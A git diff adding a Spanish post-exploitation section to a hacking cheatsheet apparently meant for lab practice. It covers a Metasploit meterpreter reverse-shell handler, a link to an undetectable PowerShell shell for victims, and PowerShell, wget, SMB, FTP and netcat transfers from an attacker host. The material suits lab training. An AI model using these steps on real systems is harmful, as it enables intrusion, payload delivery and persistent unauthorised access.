@@ -1271,8 +1271,8 @@ or on machines provided by hackthebox. They are designed to be fun to hack while
 
                  Imagina que quieres exponer tu servidor local hacia fuera, pues lo levanto o compruebo si está arriba...
 
-                     > sudo service apache2 status
-                     ○ apache2.service - The Apache HTTP Server
+                    > sudo service apache2 status
+                    ○ apache2.service - The Apache HTTP Server
                          Loaded: loaded (/lib/systemd/system/apache2.service; disabled; preset: disabled)
                          Active: inactive (dead)
                            Docs: https://httpd.apache.org/docs/2.4/
@@ -1316,6 +1316,154 @@ or on machines provided by hackthebox. They are designed to be fun to hack while
 
 
         # transferencia de ficheros.
+
+            # Powershell / Wget
+
+            Lo primero siempre para transferir ficheros entre víctima y atacante es pasar algo a la victima para que trate de crear una conexion con el atacante, luego hay que crear una conexion reversa con msfconsole en el atacante, por ejemplo,
+
+            Dicha conexión entre victima y atacante se puede hacer con powershell-fud, le pasarías para que la victima ejecute algo como ésto:
+
+            https://github.com/BlackShell256/ShellPwnsh?ref=golangexample.com
+
+            Luego, en el atacante, ejecutamos msfconsole para crear la conexion reversa:
+
+                msfconsole
+
+                use exploit/multi/handler
+
+                set payload windows/meterpreter/reverse_tcp
+
+                set lhost 192.168.85.139
+
+                set lport 4321
+
+                exploit
+
+            Ahora, lo que queremos es que el atacante pueda enviar un fichero, algo que sirva para la postexplotacion, para poder mantener la conexion con la víctima en caso de que apague el ordenador, etc...
+            En este caso, yo voy a exponer este mismo fichero en vez del exploit para hacer la conexion permanente.
+            Comando para servir el fichero en Linux con python2 y Windows, opcionalmente luego puedes exponer el puerto 8080 con LocalTunnel o ngrok:
+
+                python -m SimpleHTTPServer 8080
+                /home/kali/anaconda3/bin/python3: No module named SimpleHTTPServer
+            
+            Yo uso python3, por lo que es posible que te salga ese error de arriba, asi que, con python3 usa.
+
+                > ls
+                CheatsheetHacking.md  output-cncintel.htlml  README.md  report-cnc  report-cnc.html  report-cnc-intel  skipfish-cnc.html
+
+                > python3 -m http.server 8080
+                Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+                127.0.0.1 - - [06/Sep/2022 11:37:08] code 404, message File not found
+                127.0.0.1 - - [06/Sep/2022 11:37:08] "GET /) HTTP/1.1" 404 -
+                127.0.0.1 - - [06/Sep/2022 11:37:09] code 404, message File not found
+                127.0.0.1 - - [06/Sep/2022 11:37:09] "GET /favicon.ico HTTP/1.1" 404 -
+                127.0.0.1 - - [06/Sep/2022 11:37:16] "GET / HTTP/1.1" 200 -
+                127.0.0.1 - - [06/Sep/2022 11:38:24] code 404, message File not found
+                127.0.0.1 - - [06/Sep/2022 11:38:24] "GET /robots.txt HTTP/1.1" 404 -
+                127.0.0.1 - - [06/Sep/2022 11:38:32] "GET / HTTP/1.1" 200 -
+                127.0.0.1 - - [06/Sep/2022 11:38:53] "GET / HTTP/1.1" 200 -
+                127.0.0.1 - - [06/Sep/2022 11:38:54] code 404, message File not found
+                127.0.0.1 - - [06/Sep/2022 11:38:54] "GET /favicon.ico HTTP/1.1" 404 -
+                127.0.0.1 - - [06/Sep/2022 11:39:26] "GET / HTTP/1.1" 200 -
+                127.0.0.1 - - [06/Sep/2022 11:39:41] "GET / HTTP/1.1" 200 -
+
+            Digamos que quieres enviar a la máquina windows un fichero almacenado en la máquina victima. 
+            Comando para recibir el fichero en Windows:
+
+                powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://192.168.85.139:8080/CheatsheetHacking.md','C:\Users\test\Desktop\CheatsheetHacking.md')"
+
+            Comando para recibir el fichero en Linux:
+
+                wget http://192.168.20.X:8080/FiletoTransfer
+
+            # SMB
+
+            Comando para servir el fichero en Linux:
+                
+                https://www.kali.org/tools/impacket/
+                
+                > sudo impacket-smbserver -smb2support test .
+
+                Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
+
+                [*] Config file parsed
+                [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+                [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+                [*] Config file parsed
+                [*] Config file parsed
+                [*] Config file parsed
+
+            Comando para recibir el fichero en Linux:
+
+                Falta...
+
+            Comando para recibir el fichero en Windows:
+
+                copy \\192.168.20.X\test\FiletoTransfer FiletoTransfer
+
+            # FTP
+
+            Comando para servir el fichero en Linux:
+
+                > sudo twistd3 -n ftp -r .
+
+                [sudo] password for kali: 
+                2022-09-06T11:07:50+0200 [twisted.scripts._twistd_unix.UnixAppLogger#info] twistd 22.4.0 (/usr/bin/python3 3.10.6) starting up.
+                2022-09-06T11:07:50+0200 [twisted.scripts._twistd_unix.UnixAppLogger#info] reactor class: twisted.internet.epollreactor.EPollReactor.
+                2022-09-06T11:07:50+0200 [-] FTPFactory starting on 2121
+                2022-09-06T11:07:50+0200 [twisted.protocols.ftp.FTPFactory#info] Starting factory <twisted.protocols.ftp.FTPFactory object at 0x7f3f3f9064d0>
+
+            Comando para conectarme al servidor ftp en Linux:
+
+                > ftp ftp://localhost:2121
+                Trying [::1]:2121 ...
+                ftp: Can't connect to `::1:2121': Connection refused
+                Trying 127.0.0.1:2121 ...
+                Connected to localhost.
+                220 Twisted 22.4.0 FTP Server
+                331 Guest login ok, type your email address as password.
+                230 Anonymous login ok, access restrictions apply.
+                Remote system type is UNIX.
+                Using binary mode to transfer files.
+                200 Type set to I.
+                ftp> ls
+                227 Entering Passive Mode (127,0,0,1,139,157).
+                125 Data connection already open, starting transfer
+                drwxr-xr-x   4 kali      kali                 4096 Aug 30 16:34 skipfish-cnc.html
+                -rw-r--r--   1 kali      kali               250328 Sep 05 15:17 CheatsheetHacking.md
+                -rw-r--r--   1 root      root                    4 Sep 06 09:07 twistd.pid
+                drwxr-xr-x   8 kali      kali                 4096 Sep 05 15:17 .git
+                -rw-r--r--   1 kali      kali                  397 Aug 29 09:30 README.md
+                drwxr-xr-x   2 kali      kali                 4096 Aug 30 16:42 report-cnc-intel
+                drwxr-xr-x   4 kali      kali                 4096 Aug 30 16:36 report-cnc.html
+                -rw-r--r--   1 kali      kali                 6781 Aug 30 15:38 output-cncintel.htlml
+                drwxr-xr-x   4 kali      kali                 4096 Aug 30 16:38 report-cnc
+                226 Transfer Complete.
+            
+            Comando para recibir el fichero en Windows:
+
+                ftp
+                open 192.168.20.X 2121
+                anonymous
+                get FiletoTransfer
+                bye
+
+            Comando para recibir el fichero en Linux
+
+                wget ftp://192.168.20.X:2121/FiletoTransfer
+
+            # Netcat
+
+            Comando para recibir el fichero en Linux y Windows:
+
+                nc.exe -lvp 4444 > FiletoTransfer
+
+            Comando para servir el fichero en Linux y Windows:
+
+                nc 192.168.20.X 4444 -w 3 < FiletoTransfer
+
+            
+
 # Bypass a Web application Firewall, like CloudFlare...
 
     You need to identify what waf are behind any server, so you can use somethig like wafw00f.
